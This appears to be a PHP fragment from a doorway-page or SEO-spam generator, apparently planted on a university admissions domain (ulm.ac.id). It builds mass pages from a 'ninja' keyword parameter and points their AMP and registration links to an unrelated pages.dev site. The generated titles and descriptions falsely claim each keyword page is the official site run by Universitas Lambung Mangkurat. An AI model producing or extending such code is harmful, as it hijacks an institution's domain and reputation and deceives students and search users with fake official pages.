...
$baseAuthor = $BRAND;
$URL  = "https://internationaladmission.ulm.ac.id/?ninja=$BRAND";
$PAGEURL = "https://internationaladmission.ulm.ac.id/?ninja=$BRAND";
$AMP = "https://kuhancurkantokomu.pages.dev/$BRAND";
$DAFTAR = "https://kuhancurkantokomu.pages.dev/";
...
if ($NUMLIST >= 1 && $NUMLIST <= 31134) {
    $TITLE = "$BRAND : Internasional Universitas Lambung Mangkurat ";
    $DESCRIPTION = "$BRAND adalah situs resmi yang dikelola oleh Universitas Lambung Mangkurat untuk informasi penerimaan mahasiswa baru, termasuk program internasional dan prosedur pendaftaran. Situs ini menyediakan detail penting mengenai alur pendaftaran dan persyaratan untuk calon mahasiswa.
";
    $description = "$BRAND adalah situs resmi yang dikelola oleh Universitas Lambung Mangkurat untuk informasi penerimaan mahasiswa baru, termasuk program internasional dan prosedur pendaftaran. Situs ini menyediakan detail penting mengenai alur pendaftaran dan persyaratan untuk calon mahasiswa.
";
}
